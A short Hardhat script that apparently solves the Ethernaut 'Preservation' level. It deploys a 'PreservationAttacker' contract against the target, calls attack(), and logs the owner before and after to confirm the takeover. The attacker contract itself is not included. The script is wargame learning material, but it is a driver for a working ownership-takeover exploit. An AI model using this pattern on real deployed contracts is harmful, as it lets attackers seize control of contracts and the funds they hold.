import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x29BDCBc116f3775698AE0ffE5F8fbBaf95F240CF"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS, signer)


    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker")
    const preservationAttacker = await PreservationAttacker.connect(signer).deploy(contract.address)
    await preservationAttacker.deployed()

    console.log(await contract.owner());
    await preservationAttacker.attack();
    console.log(await contract.owner());
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });